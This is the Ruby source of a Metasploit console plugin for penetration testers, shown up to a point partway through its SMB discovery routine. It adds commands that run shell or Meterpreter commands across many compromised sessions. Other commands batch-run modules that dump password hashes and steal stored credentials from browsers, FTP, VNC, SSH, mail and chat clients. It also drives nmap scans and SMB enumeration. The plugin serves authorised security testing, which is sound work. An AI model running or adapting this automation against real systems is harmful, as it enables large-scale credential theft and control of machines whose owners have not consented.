# Copyright (c) 2012, Carlos Perez <carlos_perez[at]darkoperator.com
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted
# provided that the following conditions are met:
#
# Redistributions of source code must retain the above copyright notice, this list of conditions and
# the following disclaimer.
#
# Redistributions in binary form must reproduce the above copyright notice, this list of conditions
# and the following disclaimer in the documentation and/or other materials provided with the
# distribution.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR
# IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
# FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR
# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
# DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER
# IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
# OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
module Msf
class Plugin::Pentest < Msf::Plugin

	# Post Exploitation command class
	################################################################################################
	class PostautoCommandDispatcher

		include Msf::Auxiliary::Report
		include Msf::Ui::Console::CommandDispatcher

		def name
			"Postauto"
		end

		def commands
			{
				'multi_post'		=> "Run a post module against specified sessions.",
				'multi_post_rc'		=> "Run resource file with post modules and options against specified sessions.",
				'multi_meter_cmd'	=> "Run a Meterpreter Console Command against specified sessions.",
				'multi_meter_cmd_rc'=> "Run resource file with Meterpreter Console Commands against specified sessions.",
				"multi_cmd"			=> "Run shell command against several sessions",
				"sys_creds"			=> "Run system password collection modules against specified sessions.",
				"app_creds"			=> "Run application password collection modules against specified sessions."
			}
		end

		# Multi shell command
		def cmd_multi_cmd(*args)
			# Define options
			opts = Rex::Parser::Arguments.new(
				"-s"   => [ true,	"Comma separated list sessions to run modules against."],
				"-c"   => [ true,	"Shell command to run."],
				"-p"   => [ true,	"Platform to run the command against. If none given it will run against all."],
				"-h"   => [ false,  "Command Help."]
			)

			# set variables for options
			sessions = []
			command = ""
			plat = ""

			# Parse options
			opts.parse(args) do |opt, idx, val|
				case opt
				when "-s"
					if val =~ /all/i
						sessions = framework.sessions.keys
					else
						sessions = val.split(",")
					end
				when "-c"
					command = val
				when "-p"
					plat = val
				when "-h"
					print_line(opts.usage)
					return
                else
					print_line(opts.usage)
					return
				end
			end

			# Make sure that proper values where provided
			if not sessions.empty? and not command.empty?
				# Iterate thru the session IDs
				sessions.each do |s|
					# Set the session object
					session = framework.sessions[s.to_i]
					if session.platform =~ /#{plat}/i || plat.empty?
						host = session.tunnel_peer.split(":")[0]
						print_line("Running #{command} against session #{s}")
						# Run the command
						cmd_out = session.shell_command_token(command)
						# Print good each line of the command output
                        if not cmd_out.nil?
                            cmd_out.each_line do |l|
                                print_line(l.chomp)
                            end
                            file_name = "#{File.join(Msf::Config.loot_directory,"#{Time.now.strftime("%Y%m%d%H%M%S")}_command.txt")}"
                            framework.db.report_loot({ :host=> host,
                                    :path=> file_name,
                                    :ctype=> "text/plain",
                                    :ltype=> "host.command.shell",
                                    :data=> cmd_out,
                                    :name=>"#{host}.txt",
                                    :info=> "Output of command #{command}" })
                        else
                            print_error("No output or error when running the command.")
                        end
					end
				end
			else
				print_error("You must specify both a session and a command.")
                print_line(opts.usage)
				return
			end
		end

		# browser_creds Command
		#-------------------------------------------------------------------------------------------
		def cmd_app_creds(*args)
			opts = Rex::Parser::Arguments.new(
				"-s"   => [ true,	"Sessions to run modules against. Example <all> or <1,2,3,4>"],
				"-h"   => [ false,  "Command Help"]
			)
			cred_mods = [
				{"mod" => "windows/gather/credentials/wsftp_client", "opt" => nil},
				{"mod" => "windows/gather/credentials/winscp", "opt" => nil},
				{"mod" => "windows/gather/credentials/windows_autologin", "opt" => nil},
				{"mod" => "windows/gather/credentials/vnc", "opt" => nil},
				{"mod" => "windows/gather/credentials/trillian", "opt" => nil},
				{"mod" => "windows/gather/credentials/total_commander", "opt" => nil},
				{"mod" => "windows/gather/credentials/smartftp", "opt" => nil},
				{"mod" => "windows/gather/credentials/outlook", "opt" => nil},
				{"mod" => "windows/gather/credentials/nimbuzz", "opt" => nil},
				{"mod" => "windows/gather/credentials/mremote", "opt" => nil},
				{"mod" => "windows/gather/credentials/imail", "opt" => nil},
				{"mod" => "windows/gather/credentials/idm", "opt" => nil},
				{"mod" => "windows/gather/credentials/flashfxp", "opt" => nil},
				{"mod" => "windows/gather/credentials/filezilla_server", "opt" => nil},
				{"mod" => "windows/gather/credentials/meebo", "opt" => nil},
				{"mod" => "windows/gather/credentials/razorsql", "opt" => nil},
				{"mod" => "windows/gather/credentials/coreftp", "opt" => nil},
				{"mod" => "windows/gather/credentials/imvu", "opt" => nil},
				{"mod" => "windows/gather/credentials/epo_sql", "opt" => nil},
				{"mod" => "windows/gather/enum_ie", "opt" => nil},
				{"mod" => "multi/gather/ssh_creds", "opt" => nil},
				{"mod" => "multi/gather/pidgin_cred", "opt" => nil},
				{"mod" => "multi/gather/firefox_creds", "opt" => nil},
				{"mod" => "multi/gather/filezilla_client_cred", "opt" => nil},
			]

			# Parse options
            if args.length == 0
                print_line(opts.usage)
				return
            end
			sessions = ""

			opts.parse(args) do |opt, idx, val|
				case opt
				when "-s"
					sessions = val
				when "-h"
					print_line(opts.usage)
					return
				else
					print_line(opts.usage)
					return
				end
			end
            if not sessions.empty?
                cred_mods.each do |p|
                    m = framework.post.create(p["mod"])
                    next if m == nil

                    # Set Sessions to be processed
                    if sessions =~ /all/i
                        session_list = m.compatible_sessions
                    else
                        session_list = sessions.split(",")
                    end
                    session_list.each do |s|
                        begin
                            if m.session_compatible?(s.to_i)
                                m.datastore['SESSION'] = s.to_i
                                if p['opt']
                                    opt_pair = p['opt'].split("=",2)
                                    m.datastore[opt_pair[0]] = opt_pair[1]
                                end
                                m.options.validate(m.datastore)
                                print_line("")
                                print_line("Running #{p['mod']} against #{s}")
                                m.run_simple(
                                    'LocalInput'	=> driver.input,
                                    'LocalOutput'	=> driver.output
                                )
                            end
                        rescue
                            print_error("Could not run post module against sessions #{s}.")
                        end
                    end
                end
            else
                print_line(opts.usage)
				return
			end
		end

		# sys_creds Command
		#-------------------------------------------------------------------------------------------
		def cmd_sys_creds(*args)
			opts = Rex::Parser::Arguments.new(
				"-s"   => [ true,	"Sessions to run modules against. Example <all> or <1,2,3,4>"],
				"-h"   => [ false,  "Command Help"]
			)
			cred_mods = [
				{"mod" => "windows/gather/cachedump", "opt" => nil},
				{"mod" => "windows/gather/smart_hashdump", "opt" => "GETSYSTEM=true"},
				{"mod" => "osx/gather/hashdump", "opt" => nil},
				{"mod" => "linux/gather/hashdump", "opt" => nil},
				{"mod" => "solaris/gather/hashdump", "opt" => nil},
			]

			# Parse options

			sessions = ""
			opts.parse(args) do |opt, idx, val|
				case opt
				when "-s"
					sessions = val
				when "-h"
					print_line(opts.usage)
					return
				else
					print_line(opts.usage)
					return
				end
			end
            if not sessions.empty?
                cred_mods.each do |p|
                    m = framework.post.create(p["mod"])
                    # Set Sessions to be processed
                    if sessions =~ /all/i
                        session_list = m.compatible_sessions
                    else
                        session_list = sessions.split(",")
                    end
                    session_list.each do |s|
                        if m.session_compatible?(s.to_i)
                            m.datastore['SESSION'] = s.to_i
                            if p['opt']
                                opt_pair = p['opt'].split("=",2)
                                m.datastore[opt_pair[0]] = opt_pair[1]
                            end
                            m.options.validate(m.datastore)
                            print_line("")
                            print_line("Running #{p['mod']} against #{s}")
                            m.run_simple(
                                'LocalInput'	=> driver.input,
                                'LocalOutput'	=> driver.output
                            )
                        end
                    end
                end
            else
                print_line(opts.usage)
				return
            end
		end

		# Multi_post Command
		#-------------------------------------------------------------------------------------------
		
        # Function for doing auto complete on module name
        def tab_complete_module(str, words)
            res = []
            framework.modules.module_types.each do |mtyp|
                mset = framework.modules.module_names(mtyp)
                mset.each do |mref|
                    res << mtyp + '/' + mref
                end
            end

            return res.sort
        end

        # Function  to do tab complete on modules for multi_post
        def cmd_multi_post_tabs(str, words)
			tab_complete_module(str, words)
		end

        # Function for the multi_post command
        def cmd_multi_post(*args)
			opts = Rex::Parser::Arguments.new(
				"-s"   => [ true,	"Sessions to run module against. Example <all> or <1,2,3,4>"],
				"-m"   => [ true,   "Module to run against sessions."],
				"-o"   => [ true,   "Module options."],
				"-h"   => [ false,  "Command Help."]
			)
			post_mod = ""
			mod_opts = nil
			sessions = ""

			# Parse options
			opts.parse(args) do |opt, idx, val|
				case opt
				when "-s"
					sessions = val
				when "-m"
					post_mod = val.gsub(/^post\//,"")
				when "-o"
					mod_opts = val
				when "-h"
					print_line opts.usage
					return
				else
					print_staus "Please specify a module to run with the -m option."
					return
				end
			end
            # Make sure that proper values where provided
			if not sessions.empty? and not post_mod.empty?
                # Set and execute post module with options
                print_line("Loading #{post_mod}")
                m = framework.post.create(post_mod)
                if sessions =~ /all/i
                    session_list = m.compatible_sessions
                else
                    session_list = sessions.split(",")
                end
                if session_list
                    session_list.each do |s|
                        if m.session_compatible?(s.to_i)
                            print_line("Running against #{s}")
                            m.datastore['SESSION'] = s.to_i
                            if mod_opts
                                mod_opts.each do |o|
                                    opt_pair = o.split("=",2)
                                    print_line("\tSetting Option #{opt_pair[0]} to #{opt_pair[1]}")
                                    m.datastore[opt_pair[0]] = opt_pair[1]
                                end
                            end
                            m.options.validate(m.datastore)
                            m.run_simple(
                                'LocalInput'	=> driver.input,
                                'LocalOutput'	=> driver.output
                            )
                        else
                            print_error("Session #{s} is not compatible with #{post_mod}.")
                        end
                    end
                else
                    print_error("No compatible sessions were found.")
                end
            else
                print_error("A session or Post Module where not specified.")
                print_line(opts.usage)
				return
            end
		end

		# Multi_post_rc Command
		#-------------------------------------------------------------------------------------------
		def cmd_multi_post_rc_tabs(str, words)
                tab_complete_filenames(str, words)
		end

        def cmd_multi_post_rc(*args)
			opts = Rex::Parser::Arguments.new(
				"-rc"  => [ true,   "Resource file with space separate values <session> <module> <options>, per line."],
				"-h"   => [ false,  "Command Help."]
			)
			post_mod = nil
			session_list = nil
			mod_opts = nil
			entries = []
			opts.parse(args) do |opt, idx, val|
				case opt
				when "-rc"
					script = val
					if not ::File.exists?(script)
						print_error "Resource File does not exists!"
						return
					else
						::File.open(script, "r").each_line do |line|
							# Empty line
							next if line.strip.length < 1
							# Comment
							next if line[0,1] == "#"
							entries << line.chomp
						end
					end
				when "-h"
					print_line opts.usage
					return
				else
					print_line opts.usage
					return
				end
			end
			if entries
				entries.each do |l|
					values = l.split
                    puts l
					sessions = values[0]
					post_mod = values[1]
					if values.length == 3
						mod_opts = values[2].split(",")
					end
					print_line("Loading #{post_mod}")
					m= framework.post.create(post_mod.gsub(/^post\//,""))
					if sessions =~ /all/i
						session_list = m.compatible_sessions
					else
						session_list = sessions.split(",")
					end
					session_list.each do |s|
						if m.session_compatible?(s.to_i)
							print_line("Running Against #{s}")
							m.datastore['SESSION'] = s.to_i
							if mod_opts
								mod_opts.each do |o|
									opt_pair = o.split("=",2)
									print_line("\tSetting Option #{opt_pair[0]} to #{opt_pair[1]}")
									m.datastore[opt_pair[0]] = opt_pair[1]
								end
							end
							m.options.validate(m.datastore)
							m.run_simple(
								'LocalInput'	=> driver.input,
								'LocalOutput'	=> driver.output
							)
						else
							print_error("Session #{s} is not compatible with #{post_mod}")
						end
					end
				end
			else
				print_error("Resource file was empty!")
			end
		end

		# Multi_meter_cmd Command
		#-------------------------------------------------------------------------------------------
		def cmd_multi_meter_cmd(*args)
			opts = Rex::Parser::Arguments.new(
				"-s"   => [ true,	"Sessions to run Meterpreter Console Command against. Example <all> or <1,2,3,4>"],
				"-c"   => [ true,   "Meterpreter Console Command to run against sessions."],
				"-h"   => [ false,  "Command Help."]
			)
			command = nil
			session = nil

			# Parse options
			opts.parse(args) do |opt, idx, val|
				case opt
				when "-s"
					session = val
				when "-c"
					command = val
				when "-h"
					print_line opts.usage
					return
				else
					print_staus "Please specify a command to run with the -m option."
					return
				end
			end
			current_sessions = framework.sessions.keys.sort
			if session =~/all/i
				sessions = current_sessions
			else
				sessions = session.split(",")
			end
			sessions.each do |s|
				# Check if session is in the current session list.
				next if not current_sessions.include?(s.to_i)
				# Get session object
				session = framework.sessions.get(s.to_i)
				# Check if session is meterpreter and run command.
				if (session.type == "meterpreter")
					print_line("Running command #{command} against session #{s}")
					session.console.run_single(command)
				else
					print_line("Session #{s} is not a Meterpreter session!")
				end
			end
		end

		# Multi_post_rc Command
		#-------------------------------------------------------------------------------------------
		def cmd_multi_meter_cmd_rc(*args)
			opts = Rex::Parser::Arguments.new(
				"-rc"  => [ true,   "Resource file with space separate values <session> <command>, per line."],
				"-h"   => [ false,  "Command Help"]
			)
			entries = []
			script = nil
			opts.parse(args) do |opt, idx, val|
				case opt
				when "-rc"
					script = val
					if not ::File.exists?(script)
						print_error "Resource File does not exists"
						return
					else
						::File.open(script, "r").each_line do |line|
							# Empty line
							next if line.strip.length < 1
							# Comment
							next if line[0,1] == "#"
							entries << line.chomp
						end
					end
				when "-h"
					print_line opts.usage
					return
				else
					print_line opts.usage
					return
				end
			end
			entries.each do |entrie|
				session_parm,command = entrie.split(" ", 2)
				current_sessions = framework.sessions.keys.sort
				if session_parm =~ /all/i
					sessions = current_sessions
				else
					sessions = session_parm.split(",")
				end
				sessions.each do |s|
					# Check if session is in the current session list.
					next if not current_sessions.include?(s.to_i)
					# Get session object
					session = framework.sessions.get(s.to_i)
					# Check if session is meterpreter and run command.
					if (session.type == "meterpreter")
						print_line("Running command #{command} against session #{s}")
						session.console.run_single(command)
					else
						print_line("Session #{s} is not a Meterpreter sessions.")
					end
				end
			end
		end
	end

	# Project handling commands
	################################################################################################
	class ProjectCommandDispatcher
		include Msf::Ui::Console::CommandDispatcher

		# Set name for command dispatcher
		def name
			"Project"
		end

		# Define Commands
		def commands
			{
				"project"			=> "Command for managing projects.",
			}
		end

		def cmd_project(*args)
			# variable
			project_name = ""
			create = false
			delete = false
			history = false
			switch = false
			archive = false
			arch_path = ::File.join(Msf::Config.log_directory,"archives")
			# Define options
			opts = Rex::Parser::Arguments.new(
				"-c"   => [ false,	"Create a new Metasploit project and sets logging for it."],
				"-d"   => [ false,	"Delete a project created by the plugin."],
				"-s"   => [ false,	"Switch to a project created by the plugin."],
				"-a"   => [ false,	"Export all history and DB and archive it in to a zip file for current project."],
				"-p"   => [ true,	"Path to save archive, if none provide default ~/.msf4/archives will be used."],
				"-r"   => [ false,	"Create time stamped RC files of Meterpreter Sessions and console history for current project."],
				"-ph"  => [ false,	"Generate resource files for sessions and console. Generate time stamped session logs for current project."],
				"-l"   => [ false,	"List projects created by plugin."],
				"-h"   => [ false,  "Command Help"]
			)
			opts.parse(args) do |opt, idx, val|
				case opt
				when "-p"
					if ::File.directory?(val)
						arch_path =  val
					else
						print_error("Path provided for archive does not exists!")
						return
					end
				when "-d"
					delete = true
				when "-s"
					switch = true
				when "-a"
					archive = true
				when "-c"
					create = true
				when "-r"
					make_console_rc
					make_sessions_rc
				when "-h"
					print_line(opts.usage)
					return
				when "-l"
					list
					return
				when "-ph"
					history = true
				else
					project_name = val.gsub(" ","_").chomp
				end
			end
			if project_name and create
				project_create(project_name)
			elsif project_name and delete
				project_delete(project_name)
			elsif project_name and switch
				project_switch(project_name)
			elsif archive
				project_archive(arch_path)
			elsif history
				project_history
			else
				list
			end
		end

		def project_delete(project_name)
			# Check if project exists
			if project_list.include?(project_name)
				current_workspace = framework.db.workspace.name
				if current_workspace == project_name
					driver.init_ui(driver.input, Rex::Ui::Text::Output::Stdio.new)
				end
				workspace = framework.db.find_workspace(project_name)
				if workspace.default?
					workspace.destroy
					workspace = framework.db.add_workspace(project_name)
					print_line("Deleted and recreated the default workspace")
				else
					# switch to the default workspace if we're about to delete the current one
					framework.db.workspace = framework.db.default_workspace if framework.db.workspace.name == workspace.name
					# now destroy the named workspace
					workspace.destroy
					print_line("Deleted workspace: #{project_name}")
				end
				project_path = ::File.join(Msf::Config.log_directory,"projects",project_name)
				::FileUtils.rm_rf(project_path)
				print_line("Project folder #{project_path} has been deleted")
			else
				print_error("Project was not found on list of projects!")
			end
			return true
		end

		# Switch to another project created by the plugin
		def project_switch(project_name)
			# Check if project exists
			if project_list.include?(project_name)
				print_line("Switching to #{project_name}")
				# Disable spooling for current
				driver.init_ui(driver.input, Rex::Ui::Text::Output::Stdio.new)

				# Switch workspace
				workspace = framework.db.find_workspace(project_name)
				framework.db.workspace = workspace
				print_line("Workspace: #{workspace.name}")

				# Spool
				spool_path = ::File.join(Msf::Config.log_directory,"projects",framework.db.workspace.name)
				spool_file = ::File.join(spool_path,"#{project_name}_spool.log")

				# Start spooling for new workspace
				driver.init_ui(driver.input, Rex::Ui::Text::Output::Tee.new(spool_file))
				print_line("Spooling to file #{spool_file}...")
				print_line("Successfully migrated to #{project_name}")

			else
				print_error("Project was not found on list of projects!")
			end
			return true
		end

		# List current projects created by the plugin
		def list
			current_workspace = framework.db.workspace.name
			print_line("List of projects:")
			project_list.each do |p|
				if current_workspace == p
					print_line("\t* #{p}")
				else
					print_line("\t#{p}")
				end
			end
			return true
		end

		# Archive project in to a zip file
		def project_archive(archive_path)
			# Set variables for options
			project_name = framework.db.workspace.name
			project_path = ::File.join(Msf::Config.log_directory,"projects",project_name)
			archive_name =  "#{project_name}_#{::Time.now.strftime("%Y%m%d.%M%S")}.zip"
			db_export_name = "#{project_name}_#{::Time.now.strftime("%Y%m%d.%M%S")}.xml"
			db_out = ::File.join(project_path,db_export_name)
			format = "xml"
			print_line("Exporting DB Workspace #{project_name}")
			exporter = Msf::DBManager::Export.new(framework.db.workspace)
			exporter.send("to_#{format}_file".intern,db_out) do |mtype, mstatus, mname|
				if mtype == :status
					if mstatus == "start"
						print_line("	>> Starting export of #{mname}")
					end
					if mstatus == "complete"
						print_line("	>> Finished export of #{mname}")
					end
				end
			end
			print_line("Finished export of workspace #{framework.db.workspace.name} to #{db_out} [ #{format} ]...")
			print_line("Disabling spooling for #{project_name}")
			driver.init_ui(driver.input, Rex::Ui::Text::Output::Stdio.new)
			print_line("Spooling disabled for archiving")
			archive_full_path = ::File.join(archive_path,archive_name)
			make_console_rc
			make_sessions_rc
			make_sessions_logs
			compress(project_path,archive_full_path)
			print_line("MD5 for archive is #{digestmd5(archive_full_path)}")
			# Spool
			spool_path = ::File.join(Msf::Config.log_directory,"projects",framework.db.workspace.name)
			spool_file = ::File.join(spool_path,"#{project_name}_spool.log")
			print_line("Spooling re-enabled")
			# Start spooling for new workspace
			driver.init_ui(driver.input, Rex::Ui::Text::Output::Tee.new(spool_file))
			print_line("Spooling to file #{spool_file}...")
			return true
		end

		# Export Command History for Sessions and Console
		#-------------------------------------------------------------------------------------------
		def project_history
			make_console_rc
			make_sessions_rc
			make_sessions_logs
			return true
		end

		# Create a new project Workspace and enable logging
		#-------------------------------------------------------------------------------------------
		def project_create(project_name)
			# Make sure that proper values where provided
			spool_path = ::File.join(Msf::Config.log_directory,"projects",project_name)
			::FileUtils.mkdir_p(spool_path)
			spool_file = ::File.join(spool_path,"#{project_name}_spool.log")
			if framework.db and framework.db.active
				print_line("Creating DB Workspace named #{project_name}")
				workspace = framework.db.add_workspace(project_name)
				framework.db.workspace = workspace
				print_line("Added workspace: #{workspace.name}")
				driver.init_ui(driver.input, Rex::Ui::Text::Output::Tee.new(spool_file))
				print_line("Spooling to file #{spool_file}...")
			else
				print_error("A database most be configured and connected to create a project")
			end

			return true
		end

		# Method for creating a console resource file from all commands entered in the console
		#-------------------------------------------------------------------------------------------
		def make_console_rc
			# Set RC file path and file name
			rc_file = "#{framework.db.workspace.name}_#{::Time.now.strftime("%Y%m%d.%M%S")}.rc"
			consonle_rc_path = ::File.join(Msf::Config.log_directory,"projects",framework.db.workspace.name)
			rc_full_path = ::File.join(consonle_rc_path,rc_file)

			# Create folder
			::FileUtils.mkdir_p(consonle_rc_path)
			con_rc = ""
			framework.db.workspace.events.each do |e|
				if not e.info.nil? and e.info.has_key?(:command) and not e.info.has_key?(:session_type)
					con_rc << "# command executed at #{e.created_at}\n"
					con_rc << "#{e.info[:command]}\n"
				end
			end

			# Write RC console file
			print_line("Writing Console RC file to #{rc_full_path}")
			file_write(rc_full_path, con_rc)
			print_line("RC file written")

			return rc_full_path
		end

		# Method for creating individual rc files per session using the session uuid
		#-------------------------------------------------------------------------------------------
		def make_sessions_rc
			sessions_uuids = []
			sessions_info = []
			info = ""
			rc_file = ""
			rc_file_name = ""
			rc_list =[]

			framework.db.workspace.events.each do |e|
				if not e.info.nil? and e.info.has_key?(:command) and e.info[:session_type] =~ /meter/
					if e.info[:command] != "load stdapi"
						if not sessions_uuids.include?(e.info[:session_uuid])
							sessions_uuids << e.info[:session_uuid]
							sessions_info << {:uuid => e.info[:session_uuid],
								:type => e.info[:session_type],
								:id => e.info[:session_id],
								:info => e.info[:session_info]}
						end
					end
				end
			end

			sessions_uuids.each do |su|
				sessions_info.each do |i|
					if su == i[:uuid]
						print_line("Creating RC file for Session #{i[:id]}")
						rc_file_name = "#{framework.db.workspace.name}_session_#{i[:id]}_#{::Time.now.strftime("%Y%m%d.%M%S")}.rc"
						i.each do |k,v|
							info << "#{k.to_s}: #{v.to_s} "
						end
						break
					end
				end
				rc_file << "# Info: #{info}\n"
				info = ""
				framework.db.workspace.events.each do |e|
					if not e.info.nil? and e.info.has_key?(:command) and e.info.has_key?(:session_uuid)
						if e.info[:session_uuid] == su
							rc_file << "# command executed at #{e.created_at}\n"
							rc_file << "#{e.info[:command]}\n"
						end
					end
				end
				# Set RC file path and file name
				consonle_rc_path = ::File.join(Msf::Config.log_directory,"projects",framework.db.workspace.name)
				rc_full_path = ::File.join(consonle_rc_path,rc_file_name)
				print_line("Saving RC file to #{rc_full_path}")
				file_write(rc_full_path, rc_file)
				rc_file = ""
				print_line("RC file written")
				rc_list << rc_full_path
			end

			return rc_list
		end

		# Method for exporting session history with output
		#-------------------------------------------------------------------------------------------
		def make_sessions_logs
			sessions_uuids = []
			sessions_info = []
			info = ""
			hist_file = ""
			hist_file_name = ""
			log_list = []

			# Create list of sessions with base info
			framework.db.workspace.events.each do |e|
				if not e.info.nil? and e.info[:session_type] =~ /shell/ or e.info[:session_type] =~ /meter/
					if e.info[:command] != "load stdapi"
						if not sessions_uuids.include?(e.info[:session_uuid])
							sessions_uuids << e.info[:session_uuid]
							sessions_info << {:uuid => e.info[:session_uuid],
								:type => e.info[:session_type],
								:id => e.info[:session_id],
								:info => e.info[:session_info]}
						end
					end
				end
			end

			sessions_uuids.each do |su|
				sessions_info.each do |i|
					if su == i[:uuid]
						print_line("Exporting Session #{i[:id]} history")
						hist_file_name = "#{framework.db.workspace.name}_session_#{i[:id]}_#{::Time.now.strftime("%Y%m%d.%M%S")}.log"
						i.each do |k,v|
							info << "#{k.to_s}: #{v.to_s} "
						end
						break
					end
				end
				hist_file << "# Info: #{info}\n"
				info = ""
				framework.db.workspace.events.each do |e|
					if not e.info.nil? and e.info.has_key?(:command) or e.info.has_key?(:output)
						if e.info[:session_uuid] == su
							if e.info.has_key?(:command)
								hist_file << "#{e.updated_at}\n"
								hist_file << "#{e.info[:command]}\n"
							elsif e.info.has_key?(:output)
								hist_file << "#{e.updated_at}\n"
								hist_file << "#{e.info[:output]}\n"
							end
						end
					end
				end

				# Set RC file path and file name
				session_hist_path = ::File.join(Msf::Config.log_directory,"projects",framework.db.workspace.name)
				session_hist_fullpath = ::File.join(session_hist_path,hist_file_name)

				# Create folder
				::FileUtils.mkdir_p(session_hist_path)

				print_line("Saving log file to #{session_hist_fullpath}")
				file_write(session_hist_fullpath, hist_file)
				hist_file = ""
				print_line("Log file written")
				log_list << session_hist_fullpath
			end

			return log_list
		end

		# Compress a given folder given it's path
		#-------------------------------------------------------------------------------------------
		def compress(path,archive)
			require 'zip/zip'
			require 'zip/zipfilesystem'

			path.sub!(%r[/$],'')
			::Zip::ZipFile.open(archive, 'w') do |zipfile|
				Dir["#{path}/**/**"].reject{|f|f==archive}.each do |file|
					print_line("Adding #{file} to archive")
					zipfile.add(file.sub(path+'/',''),file)
				end
			end
			print_line("All files saved to #{archive}")
		end

		# Method to write string to file
		def file_write(file2wrt, data2wrt)
			if not ::File.exists?(file2wrt)
				::FileUtils.touch(file2wrt)
			end

			output = ::File.open(file2wrt, "a")
			data2wrt.each_line do |d|
				output.puts(d)
			end
			output.close
		end

		# Method to create MD5 of given file
		def digestmd5(file2md5)
			if not ::File.exists?(file2md5)
				raise "File #{file2md5} does not exists!"
			else
				require 'digest/md5'
				chksum = nil
				chksum = Digest::MD5.hexdigest(::File.open(file2md5, "rb") { |f| f.read})
				return chksum
			end
		end

		# Method that returns a hash of projects
		def project_list
			project_folders = Dir::entries(::File.join(Msf::Config.log_directory,"projects"))
			projects = []
			framework.db.workspaces.each do |s|
				if project_folders.include?(s.name)
					projects << s.name
				end
			end
			return projects
		end

	end

	# Project handling commands
	################################################################################################
	class DiscoveryCommandDispatcher
		include Msf::Ui::Console::CommandDispatcher

		# Set name for command dispatcher
		def name
			"Discovery"
		end

		# Define Commands
		def commands
			{
				"network_discover"  => "Performs a portscan and enumeration of services found for non pivot networks.",
				"discover_db"		=> "Run discovery modules against current hosts in the database."
			}
		end

		def cmd_discover_db(*args)

			# Variables
			range = []
			filter = []
			smb_user = nil
			smb_pass = nil
			smb_dom = "WORKGROUP"

			# Define options
			opts = Rex::Parser::Arguments.new(
				"-f"   => [ true,	"Provide a comma separated list of IP's and Ranges to skip."],
				"-U"   => [ true,	"SMB Username for discovery(optional)."],
				"-P"   => [ true,	"SMB Password for discovery(optional)."],
				"-D"   => [ true,	"SMB Domain for discovery(optional)."],
				"-h"   => [ true,	"Help Message."]
			)

			opts.parse(args) do |opt, idx, val|
				case opt

				when "-f"
					range = val.gsub(" ","").split(",")
				when "-U"
					smb_user = val
				when "-P"
					smb_pass = val
				when "-D"
					smb_dom = val
				when "-h"
					print_line opts.usage
					return
				end
			end

			# generate a list of IP's to not exploit
			range.each do |r|
				Rex::Socket::RangeWalker.new(r).each do |i|
					filter << i
				end
			end

			#after_hosts = framework.db.workspace.hosts.find_all_by_state("alive")
			framework.db.workspace.hosts.each do |h|
				# Skip those hosts that are filtered
				next if filter.include?(h.address)
				# Run the discovery modules for the services of each host
				run_smb(h.services,smb_user,smb_pass,smb_dom)
				run_version_scans(h.services)
			end
		end

		def cmd_network_discover(*args)
			# Variables
			speed = "--top-ports 1000"
			scan_type = "-A"
			range = ""
			disc_mods =  false
			smb_user = nil
			smb_pass = nil
			smb_dom = "WORKGROUP"
			# Define options
			opts = Rex::Parser::Arguments.new(
				"-r"   => [ true,	"IP Range to scan"],
				"-d"   => [ false,	"Run Framework discovery modules against found hosts."],
				"-s"   => [ true,	"Speed for scanning setting the most common ports 0: 10, 1: 100 and 2: 1000."],
				"-u"   => [ false,	"Perform UDP Scanning. NOTE:Must be ran as root."],
				"-U"   => [ true,	"SMB Username for discovery(optional)."],
				"-P"   => [ true,	"SMB Password for discovery(optional)."],
				"-D"   => [ true,	"SMB Domain for discovery(optional)."],
				"-h"   => [ true,	"Help Message."]
			)

			if args.length == 0
				print_line opts.usage
				return
			end

			opts.parse(args) do |opt, idx, val|
				case opt

				when "-r"
					# Make sure no spaces are in the range definition
					range = val.gsub(" ","")
				when "-d"
					disc_mods = true
				when "-s"
					if  val.to_s =~ /0/
						speed = "--top-ports 10"
					elsif val.to_s =~ /1/
						speed = "--top-ports 100"
					elsif val.to_s =~ /2/
						speed = "--top-ports 1000"
					end
				when "-u"
					scan_type = "--sSU"
				when "-U"
					smb_user = val
				when "-P"
					smb_pass = val
				when "-D"
					smb_dom = val
				when "-h"
					print_line opts.usage
					return
				end
			end

			# Collect current set of hosts and services before the scan
			current_hosts = framework.db.workspace.hosts.find_all_by_state("alive")
			current_services = framework.db.workspace.services.find_all_by_state("open")

			# Check that the ragne is a valid one
			ip_list = Rex::Socket::RangeWalker.new(range)
			ips_given = []
			if ip_list.length == 0
				print_error("The IP Range provided appears to not be valid.")
			else
				ip_list.each do |i|
					ips_given << i
				end
			end

			route_ips = get_routed_ips

			# Run the nmap scan, this will populate the database with the hosts and services that will be processed by the discovery modules
			cmd_str = "#{scan_type} -T4 -n #{speed} --max-rtt-timeout=500ms --initial-rtt-timeout=200ms --min-rtt-timeout=200ms --open --stats-every 5s #{range}"
			run_porscan(cmd_str)

			# Get a list of the new hosts and services after the scan and extract the new services and hosts
			after_hosts = framework.db.workspace.hosts.find_all_by_state("alive")
			after_services = framework.db.workspace.services.find_all_by_state("open")
			new_hosts = after_hosts - current_hosts
			print_good("New hosts found: #{new_hosts.count}")
			new_services = after_services - current_services
			print_good("New services found: #{new_services.count}")

			# Do service discovery only if new services where found
			if new_services.count > 0
				run_smb(new_services,smb_user,smb_pass,smb_dom)
				run_version_scans(new_services) if disc_mods
			else
				print_status("No new services where found to enumerate.")
			end
		end

		# Run Nmap scan with values provided
		def run_porscan(cmd_str)
			print_status("Running NMap with options #{cmd_str}")
			driver.run_single("db_nmap #{cmd_str}")
			return true
		end

		# Run SMB Enumeration modules
		def run_smb(services,user,pass,dom)
			print_status("Running SMB discovery moduels")
			smb_mods = [
				{"mod" => "scanner/smb/smb_version", "opt" => nil},
